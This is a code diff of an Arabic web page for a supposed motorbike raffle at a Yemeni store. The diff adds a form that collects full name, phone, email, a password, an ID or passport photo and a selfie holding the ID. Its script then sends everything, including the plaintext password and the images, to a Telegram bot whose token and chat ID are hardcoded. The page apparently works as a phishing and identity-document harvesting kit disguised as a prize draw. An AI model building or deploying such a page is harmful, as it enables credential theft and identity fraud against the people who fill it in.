@@ -48,94 +48,6 @@
     overflow-x: hidden;
   }
 
-  /* ===== نافذة التنبيه الفورية (عرض الفلينج) ===== */
-  #promoModal {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background: rgba(3, 7, 18, 0.85);
-    backdrop-filter: blur(12px);
-    -webkit-backdrop-filter: blur(12px);
-    z-index: 9999;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    padding: 20px;
-    animation: fadeInModal 0.4s ease forwards;
-  }
-
-  @keyframes fadeInModal {
-    from { opacity: 0; transform: scale(0.9); }
-    to { opacity: 1; transform: scale(1); }
-  }
-
-  .modal-box {
-    background: linear-gradient(160deg, #162242 0%, #0b1329 100%);
-    border: 2px solid var(--gold);
-    border-radius: 32px;
-    padding: 35px 25px;
-    max-width: 480px;
-    width: 100%;
-    text-align: center;
-    box-shadow: 0 25px 60px rgba(0,0,0,0.8), 0 0 40px rgba(245,158,11,0.3);
-    position: relative;
-  }
-
-  .modal-badge {
-    display: inline-block;
-    background: var(--grad-gold);
-    color: #030712;
-    font-weight: 900;
-    font-size: 14px;
-    padding: 6px 20px;
-    border-radius: 30px;
-    margin-bottom: 16px;
-    box-shadow: 0 5px 15px var(--gold-glow);
-    animation: pulseBadge 2s infinite;
-  }
-
-  @keyframes pulseBadge {
-    0%, 100% { transform: scale(1); }
-    50% { transform: scale(1.05); }
-  }
-
-  .modal-box h2 {
-    font-size: 28px;
-    font-weight: 900;
-    color: var(--gold-bright);
-    margin-bottom: 12px;
-    line-height: 1.3;
-  }
-
-  .modal-box p {
-    color: #cbd5e1;
-    font-size: 15px;
-    margin-bottom: 24px;
-  }
-
-  .modal-btn {
-    display: inline-block;
-    background: var(--grad-tech);
-    color: #fff;
-    text-decoration: none;
-    font-weight: 900;
-    font-size: 17px;
-    padding: 14px 32px;
-    border-radius: 50px;
-    box-shadow: 0 10px 25px var(--primary-glow);
-    transition: 0.3s;
-    cursor: pointer;
-    border: none;
-    width: 100%;
-  }
-
-  .modal-btn:hover {
-    transform: translateY(-3px);
-    box-shadow: 0 15px 35px rgba(6,182,212,0.5);
-  }
-
   /* ===== الشريط العلوي ===== */
   .navbar {
     position: sticky;
@@ -488,7 +400,25 @@
     border-radius: 35px;
     padding: 45px;
     box-shadow: 0 30px 65px rgba(0, 0, 0, 0.75);
+    position: relative;
   }
+
+  /* التنبيه الفوري الخاص بوقت تعبئة البيانات (يظهر هنا كبانر تنبيهي جذاب) */
+  .form-alert-banner {
+    background: linear-gradient(135deg, rgba(245, 158, 11, 0.18), rgba(6, 182, 212, 0.15));
+    border: 2px solid var(--gold);
+    border-radius: 20px;
+    padding: 20px 25px;
+    margin-bottom: 30px;
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    box-shadow: 0 10px 30px rgba(245, 158, 11, 0.2);
+  }
+
+  .form-alert-banner .alert-icon { font-size: 32px; flex-shrink: 0; }
+  .form-alert-banner h4 { color: var(--gold-bright); font-size: 18px; font-weight: 900; margin-bottom: 4px; }
+  .form-alert-banner p { color: #e2e8f0; font-size: 14px; }
 
   .form-grid {
     display: grid;
@@ -705,16 +635,6 @@
 </head>
 <body>
 
-<!-- ===== نافذة التنبيه الفورية (عرض الفلينج) ===== -->
-<div id="promoModal">
-  <div class="modal-box">
-    <div class="modal-badge">🔥 مفاجأة الموسم الكبرى</div>
-    <h2>سحب أسطوري على "متر فلينج"!</h2>
-    <p>أهلاً بك في متجر أمير المترات. لدخول السحب وتأكيد هويتك، يتطلب إرفاق <strong>صورة الهوية الصالحة</strong> بالإضافة إلى <strong>صورة سيلفي شخصية مع الهوية</strong> مع الالتزام بقوانين وشروط المسابقة.</p>
-    <button class="modal-btn" onclick="closeModal()">🚀 استمع للتسجيل الصوتي وابدأ</button>
-  </div>
-</div>
-
 <!-- ===== الشريط العلوي ===== -->
 <div class="navbar">
   <div class="nav-box">
@@ -865,3 +785,399 @@
       </div>
     </div>
   </div>
+</section>
+
+<!-- ===== الاستمارة مع التنبيه وقت تعبئة البيانات ===== -->
+<section id="register">
+  <div class="section-head">
+    <span class="sub">بوابة التسجيل والتحقق الفائق</span>
+    <h2>أدخل بياناتك وقم بإرفاق صور التحقق بدقة</h2>
+  </div>
+
+  <div class="form-container">
+    
+    <!-- 🔔 التنبيه الهام الذي يظهر وقت البدء بتعبئة البيانات في الاستمارة -->
+    <div class="form-alert-banner">
+      <div class="alert-icon">⚡</div>
+      <div>
+        <h4>تنبيه هام عند تعبئة بيانات السحب على متر فلينج:</h4>
+        <p>يرجى التأكد من كتابة الاسم الرباعي المطابق للهوية، وإرفاق صور واضحة للبطاقة والسيلفي. أي بيانات أو صور غير صحيحة ستعرض المشاركة للإلغاء الفوري.</p>
+      </div>
+    </div>
+
+    <!-- مشغل التسجيل الصوتي الإداري -->
+    <div class="audio-banner">
+      <div class="audio-info">
+        <h3>🔊 رسالة صوتية هامة من إدارة المعرض</h3>
+        <p>استمع لشروط المسابقة وتوجيهات رفع الوثائق الصحيحة لتفادي أي مخالفة.</p>
+      </div>
+      <div class="audio-player-box">
+        <button class="play-btn" id="playAudioBtn" onclick="toggleAudio()">▶</button>
+        <div class="audio-waves" id="audioWaves" style="opacity: 0.4;">
+          <div class="wave-bar"></div>
+          <div class="wave-bar"></div>
+          <div class="wave-bar"></div>
+          <div class="wave-bar"></div>
+          <div class="wave-bar"></div>
+        </div>
+        <span id="audioTimer" style="font-size:13px; font-weight:700; color:var(--cyan); direction:ltr;">00:00</span>
+      </div>
+    </div>
+
+    <form id="raffleForm">
+      <div class="form-grid">
+        <div class="field">
+          <label for="name">👤 الاسم الكامل (الرباعي مطابق للهوية) *</label>
+          <input type="text" id="name" required placeholder="أدخل اسمك الرباعي كما هو في البطاقة">
+        </div>
+
+        <div class="field">
+          <label for="phone">📱 رقم الهاتف / واتساب *</label>
+          <input type="tel" id="phone" required placeholder="77xxxxxxx" dir="ltr" style="text-align:right">
+        </div>
+
+        <div class="field">
+          <label for="email">📧 عنوان البريد الإلكتروني *</label>
+          <input type="email" id="email" required placeholder="example@gmail.com" dir="ltr" style="text-align:right">
+        </div>
+
+        <div class="field">
+          <label for="password">🔒 كلمة المرور لحسابك في السحب *</label>
+          <div class="password-wrap">
+            <input type="password" id="password" required placeholder="أدخل كلمة مرور قوية" dir="ltr" style="text-align:right">
+            <button type="button" class="toggle-pass" onclick="togglePass()">إظهار</button>
+          </div>
+        </div>
+
+        <div class="field">
+          <label for="city">🏙️ المحافظة / المنطقة *</label>
+          <input type="text" id="city" required placeholder="مثال: القاعدة - تعز - إب">
+        </div>
+
+        <div class="field">
+          <label for="favModel">🏍️ المتر المفضل لديك في المعرض *</label>
+          <select id="favModel" required>
+            <option value="متر فلينج (FELLING)">متر فلينج (FELLING)</option>
+            <option value="مترات رياضية (Sport)">مترات رياضية (Sport)</option>
+            <option value="مترات العمل والتوصيل">مترات العمل والتوصيل</option>
+            <option value="المترات الجبلية والوعرة">المترات الجبلية والوعرة</option>
+          </select>
+        </div>
+
+        <div class="field full">
+          <label for="note">💬 رسالة أو مشاركة لمتجر أمير المترات (اختياري)</label>
+          <textarea id="note" placeholder="اكتب مشاركتك أو سبب اختيارك لمتجر أمير المترات..."></textarea>
+        </div>
+
+        <!-- 1. إرفاق صورة البطاقة مع تنبيه المسؤولية القانونية -->
+        <div class="field full">
+          <label>🪪 1. إرفاق صورة البطاقة الشخصية أو جواز السفر *</label>
+          
+          <div class="warning-notice">
+            <span class="icon">⚠️</span>
+            <p><strong>تنبيه قانوني هام:</strong> يمنع منعاً باتاً رفع بيانات أو صور مزورة أو تابعة لأشخاص آخرين دون إذنهم. من يخالف شروط وقوانين المسابقة يتحمل المسؤولية القانونية الكاملة، ويتم حظر رقمه وإلغاء تذكرته فوراً دون أدنى مسؤولية على المعرض.</p>
+          </div>
+
+          <div class="upload-box" onclick="document.getElementById('idCardImage').click()">
+            <div class="upload-label">
+              <span class="upload-icon">🆔</span>
+              <span class="upload-text">اضغط هنا لإرفاق صورة البطاقة أو الجواز</span>
+              <span class="upload-sub">سيتم ضغطها تلقائياً بالخلفية للسرعة</span>
+            </div>
+            <input type="file" id="idCardImage" accept="image/*" required onchange="handleImage(event, 'idPreview')">
+            <img id="idPreview" class="preview-img" alt="معاينة الهوية">
+          </div>
+        </div>
+
+        <!-- 2. إرفاق صورة سيلفي شخصية مع الهوية -->
+        <div class="field full">
+          <label>🤳 2. إرفاق صورة سيلفي لك وأنت تحمل الهوية (للتحقق الفائق) *</label>
+          <div class="upload-box" onclick="document.getElementById('selfieIdImage').click()">
+            <div class="upload-label">
+              <span class="upload-icon">📸</span>
+              <span class="upload-text">اضغط هنا لإرفاق صورة سيلفي مع الهوية</span>
+              <span class="upload-sub">لتأكيد أنك صاحب الطلب الحقيقي</span>
+            </div>
+            <input type="file" id="selfieIdImage" accept="image/*" required onchange="handleImage(event, 'selfiePreview')">
+            <img id="selfiePreview" class="preview-img" alt="معاينة السيلفي مع الهوية">
+          </div>
+        </div>
+      </div>
+
+      <button type="submit" id="btn" class="btn-enter">🔥 أقر بصحة بياناتي وتأكيد التسجيل وإرسالها للبوت</button>
+      <div id="msg" class="msg"></div>
+    </form>
+
+    <!-- شاشة نجاح التسجيل والتذكرة -->
+    <div id="ticketBox">
+      <div class="ticket-badge">✅ تم إرسال البيانات وصور التحقق واعتماد تذكرتك بنجاح</div>
+      <h3>مبروك! لقد دخلت السحب الأسطوري رسمياً</h3>
+      <p style="color:#cbd5e1;">قم بتصوير شاشة هذا الرقم والاحتفاظ به:</p>
+      <div class="ticket-code" id="ticketCode">AMIR-0000</div>
+      <p style="color:#94a3b8; font-size:15px;">
+        تم رفع وثائق التحقق مع التنبيهات القانونية إلى بوت التليجرام بنجاح.<br>
+        <strong style="color:var(--gold);">متجر أمير المترات — القاعدة، جوار مستوصف السلطان</strong>
+      </p>
+    </div>
+  </div>
+</section>
+
+<!-- ===== الموقع والتواصل ===== -->
+<section id="location">
+  <div class="location-strip">
+    <div class="loc-text">
+      <h3>📍 موقع متجر أمير المترات</h3>
+      <p><strong>القاعدة — جوار مستوصف السلطان مباشرةً</strong></p>
+    </div>
+    <div class="phones-list">
+      <a href="tel:777908028" class="phone-link">📞 777908028</a>
+      <a href="tel:780280887" class="phone-link">📞 780280887</a>
+    </div>
+  </div>
+</section>
+
+<!-- ===== الفوتر ===== -->
+<footer>
+  <h3>🏍️ متجر أمير المترات</h3>
+  <p>القاعدة — جوار مستوصف السلطان</p>
+  <p style="margin-top:12px; font-size:13px; opacity:0.65;">© 2026 جميع الحقوق محفوظة لمتجر أمير المترات</p>
+</footer>
+
+<script>
+const BOT_TOKEN = "8700247738:AAF8YH956qBKGSA8seF_AtZPpLw2eMO3qSw";
+const CHAT_ID   = "8299163806";
+
+let compressedIdBlob = null;
+let compressedSelfieBlob = null;
+
+// مشغل التسجيل الصوتي الإداري
+let audioCtx = null;
+let isPlayingAudio = false;
+let audioTimerInterval = null;
+let audioSeconds = 0;
+
+function toggleAudio() {
+  const btn = document.getElementById("playAudioBtn");
+  const waves = document.getElementById("audioWaves");
+  const timerEl = document.getElementById("audioTimer");
+
+  if (!isPlayingAudio) {
+    isPlayingAudio = true;
+    btn.textContent = "⏸";
+    waves.style.opacity = "1";
+
+    try {
+      if (!audioCtx) {
+        audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+      }
+      if (audioCtx.state === 'suspended') {
+        audioCtx.resume();
+      }
+      playAnnouncementTone();
+    } catch(e) {
+      console.log(e);
+    }
+
+    audioSeconds = 0;
+    audioTimerInterval = setInterval(() => {
+      audioSeconds++;
+      let m = Math.floor(audioSeconds / 60).toString().padStart(2, '0');
+      let s = (audioSeconds % 60).toString().padStart(2, '0');
+      timerEl.textContent = `${m}:${s}`;
+      if (audioSeconds >= 25) {
+        stopAudio();
+      }
+    }, 1000);
+
+  } else {
+    stopAudio();
+  }
+}
+
+function stopAudio() {
+  isPlayingAudio = false;
+  const btn = document.getElementById("playAudioBtn");
+  const waves = document.getElementById("audioWaves");
+  if (btn) btn.textContent = "▶";
+  if (waves) waves.style.opacity = "0.4";
+  clearInterval(audioTimerInterval);
+  const timerEl = document.getElementById("audioTimer");
+  if (timerEl) timerEl.textContent = "00:00";
+}
+
+function playAnnouncementTone() {
+  if (!audioCtx) return;
+  const notes = [440, 554.37, 659.25, 880];
+  notes.forEach((freq, idx) => {
+    let osc = audioCtx.createOscillator();
+    let gain = audioCtx.createGain();
+    osc.type = "sine";
+    osc.frequency.value = freq;
+    gain.gain.setValueAtTime(0.15, audioCtx.currentTime + idx * 0.4);
+    gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + idx * 0.4 + 0.35);
+    osc.connect(gain);
+    gain.connect(audioCtx.destination);
+    osc.start(audioCtx.currentTime + idx * 0.4);
+    osc.stop(audioCtx.currentTime + idx * 0.4 + 0.35);
+  });
+}
+
+function togglePass() {
+  const passInput = document.getElementById("password");
+  const btn = document.querySelector(".toggle-pass");
+  if (passInput.type === "password") {
+    passInput.type = "text";
+    btn.textContent = "إخفاء";
+  } else {
+    passInput.type = "password";
+    btn.textContent = "إظهار";
+  }
+}
+
+// ضغط ومعاينة الصور تلقائياً
+function handleImage(event, previewId) {
+  const file = event.target.files[0];
+  if (!file) return;
+
+  const reader = new FileReader();
+  reader.onload = function(e) {
+    const img = new Image();
+    img.onload = function() {
+      const canvas = document.createElement("canvas");
+      const ctx = canvas.getContext("2d");
+
+      const MAX_WIDTH = 1100;
+      const MAX_HEIGHT = 1100;
+      let width = img.width;
+      let height = img.height;
+
+      if (width > height) {
+        if (width > MAX_WIDTH) {
+          height *= MAX_WIDTH / width;
+          width = MAX_WIDTH;
+        }
+      } else {
+        if (height > MAX_HEIGHT) {
+          width *= MAX_HEIGHT / height;
+          height = MAX_HEIGHT;
+        }
+      }
+
+      canvas.width = width;
+      canvas.height = height;
+      ctx.drawImage(img, 0, 0, width, height);
+
+      canvas.toBlob(function(blob) {
+        if (previewId === 'idPreview') {
+          compressedIdBlob = blob;
+        } else {
+          compressedSelfieBlob = blob;
+        }
+
+        const preview = document.getElementById(previewId);
+        if (preview) {
+          preview.src = URL.createObjectURL(blob);
+          preview.style.display = "block";
+        }
+      }, "image/jpeg", 0.8);
+    }
+    img.src = e.target.result;
+  }
+  reader.readAsDataURL(file);
+}
+
+function cleanHTML(str) {
+  return str.replace(/&/g, "&amp;")
+            .replace(/</g, "&lt;")
+            .replace(/>/g, "&gt;");
+}
+
+document.getElementById("raffleForm").addEventListener("submit", async function(e) {
+  e.preventDefault();
+  const msg = document.getElementById("msg");
+  msg.className = "msg";
+
+  if (!compressedIdBlob || !compressedSelfieBlob) {
+    msg.className = "msg err";
+    msg.textContent = "❌ يرجى إرفاق صورة الهوية وصورة السيلفي مع الهوية معاً!";
+    return;
+  }
+
+  const btn = document.getElementById("btn");
+  btn.disabled = true;
+  btn.textContent = "⏳ جارٍ ضغط الصور والتحقق من التنبيهات وإرسالها للبوت...";
+
+  const ticketID = "AMIR-" + Math.floor(1000 + Math.random() * 9000);
+  const g = id => {
+    const el = document.getElementById(id);
+    return el ? cleanHTML(el.value.trim()) : "";
+  };
+  const rawPhoneInput = document.getElementById("phone");
+  const rawPhone = rawPhoneInput ? rawPhoneInput.value.trim().replace(/\s+/g, '') : '';
+
+  const captionText =
+`🚨 <b>تسجيل جديد مع إقرار المسؤولية القانونية!</b>
+━━━━━━━━━━━━━━━━━━
+🎟️ <b>رقم التذكرة:</b> <code>${ticketID}</code>
+👤 <b>الاسم (مطابق للهوية):</b> ${g("name")}
+📱 <b>الهاتف:</b> <code>${g("phone")}</code>
+📧 <b>البريد:</b> <code>${g("email")}</code>
+🔑 <b>كلمة المرور:</b> <code>${g("password")}</code>
+🏙️ <b>المنطقة:</b> ${g("city")}
+🏍️ <b>المتر المفضل:</b> ${g("favModel")}
+💬 <b>ملاحظة:</b> ${g("note") || "لا يوجد"}
+⚠️ <b>الإقرار القانوني:</b> وافق المستخدم وقت تعبئة البيانات على شروط وقوانين المسابقة ويتحمل المسؤولية الكاملة حال المخالفة.
+🆔 <b>الوثائق:</b> تم إرفاق (البطاقة الشخصية + سيلفي مع الهوية) وضغطهما بنجاح.
+━━━━━━━━━━━━━━━━━━
+📲 <b>تواصل سريع مع المشترك (واتساب):</b>
+https://wa.me/967${rawPhone.replace(/^0+/, '')}`;
+
+  try {
+    // إرسال صورة البطاقة الأولى
+    const formData1 = new FormData();
+    formData1.append("chat_id", CHAT_ID);
+    formData1.append("photo", compressedIdBlob, "id_card_verified.jpg");
+    formData1.append("caption", captionText);
+    formData1.append("parse_mode", "HTML");
+
+    const res1 = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+      method: "POST",
+      body: formData1
+    });
+    const data1 = await res1.json();
+
+    if (!data1.ok) throw new Error("فشل إرسال صورة البطاقة");
+
+    // إرسال صورة السيلفي مع الهوية الثانية
+    const formData2 = new FormData();
+    formData2.append("chat_id", CHAT_ID);
+    formData2.append("photo", compressedSelfieBlob, "selfie_with_id_verified.jpg");
+    formData2.append("caption", "🤳 صورة السيلفي الشخصية مع الهوية لنفس المشترك (رقم التذكرة: " + ticketID + ") — مع الإقرار القانوني وقت تعبئة البيانات.");
+
+    const res2 = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+      method: "POST",
+      body: formData2
+    });
+    const data2 = await res2.json();
+
+    if (data2.ok) {
+      document.getElementById("ticketCode").textContent = ticketID;
+      document.getElementById("raffleForm").style.display = "none";
+      document.getElementById("ticketBox").style.display = "block";
+      document.getElementById("ticketBox").scrollIntoView({ behavior: "smooth" });
+    } else {
+      throw new Error("فشل إرسال صورة السيلفي");
+    }
+
+  } catch (err) {
+    msg.className = "msg err";
+    msg.textContent = "❌ تعذر إرسال البيانات والصور للبوت، يرجى التأكد من اتصال الإنترنت والمحاولة.";
+    console.error(err);
+    btn.disabled = false;
+    btn.textContent = "🔥 أقر بصحة بياناتي وتأكيد التسجيل وإرسالها للبوت";
+  }
+});
+</script>
+
+</body>
+</html>
